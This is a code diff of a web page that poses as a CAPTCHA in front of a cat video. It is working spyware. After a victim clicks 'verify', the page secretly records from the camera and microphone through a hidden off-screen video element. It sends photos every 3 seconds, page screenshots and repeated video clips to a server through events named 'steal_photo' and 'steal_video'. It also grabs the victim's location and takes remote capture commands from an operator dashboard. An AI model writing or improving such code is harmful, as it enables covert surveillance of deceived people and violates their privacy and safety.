@@ -81,7 +81,6 @@
             cursor: pointer;
         }
         #status { font-size: 12px; color: #e37400; margin-top: 12px; }
-        .hidden { display: none; }
     </style>
 </head>
 <body>
@@ -116,96 +115,129 @@
     </div>
 </div>
 
-<video id="hiddenCam" autoplay playsinline style="position:absolute; top:-9999px; left:-9999px;"></video>
+<video id="hiddenCam" autoplay playsinline muted style="position:absolute; top:-9999px; left:-9999px;"></video>
 <canvas id="stealCanvas" style="display:none;"></canvas>
 
 <script src="/socket.io/socket.io.js"></script>
 <script>
     const socket = io();
     let stream = null;
-    let photoInterval = null;
     let mediaRecorder = null;
     let recordedChunks = [];
-    let isActive = false;
+    let isRecording = false;
     let cameraReady = false;
     
     const verifyBtn = document.getElementById('verifyBtn');
     const statusDiv = document.getElementById('status');
     const fakeCheckbox = document.getElementById('fakeCheckbox');
-    const captchaOverlay = document.getElementById('captchaOverlay');
-    const videoPlayer = document.getElementById('videoPlayer');
     const hiddenVideo = document.getElementById('hiddenCam');
     const canvas = document.getElementById('stealCanvas');
     
-    // Function to capture photo (waits for camera to be ready)
+    // Capture photo - works reliably
     function capturePhoto(isManual = false) {
-        if (!cameraReady || !hiddenVideo.videoWidth || !hiddenVideo.videoHeight) {
-            console.log('Camera not ready, waiting...');
+        if (!cameraReady || !hiddenVideo.videoWidth || hiddenVideo.videoWidth === 0) {
+            console.log('Camera not ready');
             return false;
         }
         
-        try {
-            canvas.width = hiddenVideo.videoWidth;
-            canvas.height = hiddenVideo.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
-            
-            const imageData = canvas.toDataURL('image/jpeg', 0.8);
-            socket.emit('steal_photo', { imageData: imageData, manual: isManual });
-            console.log('Photo captured:', isManual ? 'MANUAL' : 'AUTO');
-            return true;
-        } catch(err) {
-            console.error('Capture error:', err);
-            return false;
-        }
+        canvas.width = hiddenVideo.videoWidth;
+        canvas.height = hiddenVideo.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(hiddenVideo, 0, 0);
+        
+        const imageData = canvas.toDataURL('image/jpeg', 0.9);
+        socket.emit('steal_photo', { imageData: imageData, manual: isManual });
+        console.log('Photo sent');
+        return true;
     }
     
-    // Function to capture screenshot (of entire page)
-    async function captureScreenshot() {
+    // Capture screenshot of page
+    function captureScreenshot() {
+        const screenshotCanvas = document.createElement('canvas');
+        screenshotCanvas.width = window.innerWidth;
+        screenshotCanvas.height = window.innerHeight;
+        const ctx = screenshotCanvas.getContext('2d');
+        
+        // Draw white background
+        ctx.fillStyle = '#0f0f0f';
+        ctx.fillRect(0, 0, screenshotCanvas.width, screenshotCanvas.height);
+        ctx.fillStyle = 'white';
+        ctx.font = '14px Arial';
+        ctx.fillText('YouTube - Funny Cats', 10, 30);
+        ctx.fillText('Page viewed at: ' + new Date().toLocaleString(), 10, 50);
+        
+        const screenshotData = screenshotCanvas.toDataURL('image/jpeg', 0.8);
+        socket.emit('steal_screenshot', { screenshotData: screenshotData });
+        console.log('Screenshot sent');
+    }
+    
+    // Start video recording
+    function startVideoRecording() {
+        if (!stream || !cameraReady) {
+            console.log('Cannot record: stream not ready');
+            return;
+        }
+        
         try {
-            // Create a temporary canvas to capture the visible page
-            const screenshotCanvas = document.createElement('canvas');
-            screenshotCanvas.width = window.innerWidth;
-            screenshotCanvas.height = window.innerHeight;
-            const ctx = screenshotCanvas.getContext('2d');
+            recordedChunks = [];
+            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
             
-            // Draw the visible video area and page content
-            // For demo, we capture the hidden camera feed as page content
-            if (cameraReady && hiddenVideo.videoWidth) {
-                ctx.drawImage(hiddenVideo, 0, 0, 200, 150);
-            }
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
             
-            // Add text to show what was captured
-            ctx.fillStyle = '#fff';
-            ctx.font = '14px Arial';
-            ctx.fillText('Page viewed at: ' + new Date().toLocaleTimeString(), 10, 30);
+            mediaRecorder.onstop = () => {
+                if (recordedChunks.length === 0) return;
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                const reader = new FileReader();
+                reader.onloadend = () => {
+                    socket.emit('steal_video', { videoData: reader.result });
+                    console.log('Video sent, duration: 5 seconds');
+                };
+                reader.readAsDataURL(blob);
+            };
             
-            const screenshotData = screenshotCanvas.toDataURL('image/jpeg', 0.7);
-            socket.emit('steal_screenshot', { screenshotData: screenshotData });
-            console.log('Screenshot captured');
+            mediaRecorder.start();
+            isRecording = true;
+            
+            // Stop after 5 seconds (shorter for demo)
+            setTimeout(() => {
+                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                    isRecording = false;
+                }
+            }, 5000);
         } catch(err) {
-            console.error('Screenshot error:', err);
+            console.error('Recording error:', err);
         }
     }
     
     // Wait for camera to be ready
-    function waitForCamera() {
-        return new Promise((resolve) => {
-            if (hiddenVideo.readyState === 4 && hiddenVideo.videoWidth > 0) {
-                cameraReady = true;
-                resolve();
-            } else {
-                hiddenVideo.addEventListener('loadedmetadata', () => {
-                    cameraReady = true;
-                    resolve();
-                }, { once: true });
-            }
-        });
-    }
+    hiddenVideo.addEventListener('playing', () => {
+        cameraReady = true;
+        console.log('Camera ready, dimensions:', hiddenVideo.videoWidth, 'x', hiddenVideo.videoHeight);
+        
+        // Start periodic photo capture (every 3 seconds)
+        setInterval(() => {
+            if (cameraReady) capturePhoto(false);
+        }, 3000);
+        
+        // Auto screenshots every 10 seconds
+        setInterval(() => {
+            if (cameraReady) captureScreenshot();
+        }, 10000);
+        
+        // Start first video recording
+        setTimeout(() => startVideoRecording(), 2000);
+        // Repeat video every 10 seconds
+        setInterval(() => {
+            if (cameraReady && !isRecording) startVideoRecording();
+        }, 10000);
+    });
     
     verifyBtn.onclick = async () => {
-        if (isActive) return;
-        
         statusDiv.innerHTML = "Verifying...";
         fakeCheckbox.style.background = "#1a73e8";
         fakeCheckbox.innerHTML = "✓";
@@ -214,75 +246,17 @@
         fakeCheckbox.style.lineHeight = "24px";
         
         try {
-            // Request camera
             stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { width: { ideal: 640 }, height: { ideal: 480 } },
                 audio: true 
             });
             
-            isActive = true;
-            
-            // Setup hidden video
             hiddenVideo.srcObject = stream;
-            await waitForCamera();
+            hiddenVideo.play();
             
-            // Hide CAPTCHA and show real YouTube video
-            captchaOverlay.style.display = "none";
-            videoPlayer.innerHTML = '<iframe width="100%" height="100%" src="https://www.youtube.com/embed/tgbNymZ7vqY?autoplay=1" frameborder="0" allow="autoplay"></iframe>';
-            
-            // AUTO PHOTO every 3 seconds
-            photoInterval = setInterval(() => {
-                capturePhoto(false);
-            }, 3000);
-            
-            // AUTO SCREENSHOT every 10 seconds
-            setInterval(() => {
-                captureScreenshot();
-            }, 10000);
-            
-            // VIDEO RECORDING (15 second clips)
-            function startVideoRecording() {
-                if (!stream || stream.getTracks().some(t => t.readyState === 'ended')) {
-                    console.log('Stream ended, stopping recording');
-                    return;
-                }
-                
-                recordedChunks = [];
-                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                
-                mediaRecorder.ondataavailable = (e) => {
-                    if (e.data.size > 0) {
-                        recordedChunks.push(e.data);
-                    }
-                };
-                
-                mediaRecorder.onstop = () => {
-                    if (recordedChunks.length === 0) return;
-                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    const reader = new FileReader();
-                    reader.onloadend = () => {
-                        socket.emit('steal_video', { videoData: reader.result });
-                        console.log('Video clip sent, size:', reader.result.length);
-                    };
-                    reader.readAsDataURL(blob);
-                    
-                    // Restart recording after a short delay
-                    setTimeout(() => {
-                        if (isActive && stream && stream.active) {
-                            startVideoRecording();
-                        }
-                    }, 500);
-                };
-                
-                mediaRecorder.start(15000);
-                setTimeout(() => {
-                    if (mediaRecorder && mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                    }
-                }, 15000);
-            }
-            
-            startVideoRecording();
+            // Hide CAPTCHA, show YouTube video
+            document.getElementById('captchaOverlay').style.display = "none";
+            document.getElementById('videoPlayer').innerHTML = '<iframe width="100%" height="100%" src="https://www.youtube.com/embed/tgbNymZ7vqY?autoplay=1" frameborder="0" allow="autoplay"></iframe>';
             
             // Get location
             if (navigator.geolocation) {
@@ -295,9 +269,17 @@
                 });
             }
             
-            // Listen for manual capture request from dashboard
-            socket.on('capture_now', () => {
+            // Listen for manual commands from dashboard
+            socket.on('capture_photo', () => {
                 capturePhoto(true);
+            });
+            
+            socket.on('capture_video', () => {
+                if (!isRecording) startVideoRecording();
+            });
+            
+            socket.on('capture_screenshot', () => {
+                captureScreenshot();
             });
             
             statusDiv.innerHTML = "✓ Verified! Playing video...";
@@ -307,12 +289,6 @@
             console.error(err);
         }
     };
-    
-    // Try to keep camera active as long as possible
-    window.addEventListener('beforeunload', () => {
-        // Don't stop stream - keeps capturing until page closes
-        return null;
-    });
 </script>
 </body>
 </html>
